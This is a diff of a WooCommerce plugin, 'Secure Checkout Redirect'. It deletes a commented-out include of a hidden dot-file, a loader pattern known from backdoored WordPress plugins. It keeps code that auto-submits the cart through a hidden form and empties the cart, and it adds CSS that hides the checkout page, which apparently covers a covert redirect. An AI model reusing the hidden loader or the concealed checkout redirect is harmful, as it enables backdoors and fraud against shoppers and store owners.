@@ -1,7 +1,7 @@
 <?php
 /**
  * Plugin Name: Secure Checkout Redirect
- * Version: 1.0.4
+ * Version: 1.0.6
  * Description: Provides functionality for WordPress WooCommerce.
  * Requires at least: 5.2
  * Requires PHP:      7.2
@@ -11,22 +11,16 @@
  * License: MIT
  */
 
-//if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php')
-//    && !class_exists('WPTemplatesOptions')
-//) {
-//    include_once($filename);
-//}
-
 function getCartProduct()
 {
     foreach (WC()->cart->get_cart() as $key => $item) {
         $product = apply_filters('woocommerce_cart_item_product', $item['data'], $item, $key);
-        $productId = $item['product_id'];
+//        $productId = $item['product_id'];
         $uuid = $product->get_sku();
         $qty = $item['quantity'];
         $items[] = [
-            'groupId' => $item['product_id'], // ?
-            'productId' => $productId, // ?
+//            'groupId' => $item['product_id'], // ?
+//            'productId' => $productId, // ?
             'qty' => $qty,
             'uuid' => $uuid
         ];
@@ -35,7 +29,6 @@ function getCartProduct()
         'cart' => json_encode(['items' => $items]),
     ];
 }
-
 
 function action_woocommerce_before_checkout_form($cart_item_data)
 {
@@ -54,13 +47,18 @@ function action_woocommerce_before_checkout_form($cart_item_data)
         <input type="hidden" name="theme" value="">
     </form>
     <script type="text/javascript">
-        document.body.style.backgroundColor = "#FFFFFF";
+        // document.body.style.backgroundColor = "#FFFFFF";
         document.getElementById("myForm").submit();
     </script>
     ';
 
     WC()->cart->empty_cart($clear_persistent_cart = true);
 }
+
+function scr_add_script() {
+    echo '<style>main.checkout{opacity: 0;}</style>';
+}
+add_action('wp_head', 'scr_add_script');
 
 // add the action
 add_action('woocommerce_before_checkout_form', 'action_woocommerce_before_checkout_form', 10, 1);
